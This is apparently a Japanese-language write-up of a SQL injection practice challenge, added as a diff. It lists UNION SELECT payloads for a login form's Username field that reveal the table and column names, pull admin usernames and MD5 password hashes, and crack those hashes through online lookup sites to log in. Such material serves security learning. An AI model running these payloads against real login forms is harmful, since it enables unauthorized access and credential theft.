@@ -1,0 +1,77 @@
+
+
+
+ヒントとなる問3.
+テーブル名を取得するためには、Usernameに(??)と入力すればよい。
+え） ' UNION SELECT name FROM sqlite_sequence;--
+
+ourcustomertable
+
+ヒントとなる問4.
+一つ目のカラム名を取得するためには、Usernameに(??)と入力し、エラーメッセージを確認すればよい。
+え） ' UNION SELECT * FROM ourcustomertable JOIN ourcustomertable;
+
+ambiguous column name: main.ourcustomertable.id
+
+ヒントとなる問5.
+二つ目のカラム名(ユーザ名のカラム名)を取得するためには、Usernameに(??)と入力し、エラーメッセージを確認すればよい。
+
+え） ' UNION SELECT * FROM ourcustomertable JOIN ourcustomertable USING(id);
+
+ambiguous column name: main.ourcustomertable.username___Aeyo6fah4iep_
+
+
+' UNION SELECT * FROM ourcustomertable JOIN ourcustomertable USING(id,username___Aeyo6fah4iep_);
+
+ambiguous column name: main.ourcustomertable.userpwd____veryrandomstrings__
+
+ヒントとなる問2.
+Webアプリケーション内部では、
+
+    SELECT カラム名 FROM テーブル名 WHERE ユーザ名のカラム名 = 'username' AND パスワードのカラム名 = 'md5(password)';
+
+
+というSQL文が発行されていると推測できるので、(??)というSQL文をインジェクションすれば一人目のadminユーザのパスワードが表示される。
+
+え） ' UNION SELECT userpwd____veryrandomstrings__ FROM ourcustomertable WHERE username___Aeyo6fah4iep_ LIKE '%admin%' LIMIT 1 OFFSET 1;--
+
+' UNION SELECT userpwd____veryrandomstrings__ FROM ourcustomertable WHERE username___Aeyo6fah4iep_ LIKE '%admin%' ;--
+
+c23cc813361e0f1d723c4062217e08a9
+788073cefde4b240873e1f52f5371d7d
+
+
+
+
+' UNION SELECT username___Aeyo6fah4iep_ FROM ourcustomertable WHERE username___Aeyo6fah4iep_ LIKE '%admin%' LIMIT 1 OFFSET 1;--
+rwsadminxxyz
+
+' UNION SELECT username___Aeyo6fah4iep_ FROM ourcustomertable WHERE username___Aeyo6fah4iep_ LIKE '%admin%' ;--
+admin_xxyz
+
+' UNION SELECT username___Aeyo6fah4iep_ FROM ourcustomertable WHERE username___Aeyo6fah4iep_ LIKE '%admin%' LIMIT 1 OFFSET 2;--
+
+SELECT カラム名 FROM テーブル名 WHERE ユーザ名のカラム名 = '' UNION SELECT userpwd____veryrandomstrings__ FROM ourcustomertable WHERE username___Aeyo6fah4iep_ LIKE '%admin%' LIMIT 1 OFFSET 1;--' AND パスワードのカラム名 = 'md5(password)';
+
+
+rwsadminxxyz';--
+admin_xxyz';--
+
+' UNION SELECT userpwd____veryrandomstrings__ FROM ourcustomertable WHERE username___Aeyo6fah4iep_ LIKE '%admin%' LIMIT 1;--
+
+
+Google で、ハッシュ値を検索
+
+MD5を解読する方法 - このブログは証明できない。
+http://d.hatena.ne.jp/shunsuk/20071122/1195704611
+
+
+http://md5-database.org/md5/
+
+rwsadminxxyz
+c23cc813361e0f1d723c4062217e08a9 -> admin48
+
+admin_xxyz
+788073cefde4b240873e1f52f5371d7d -> admin7
+
+上記でログインできた！！
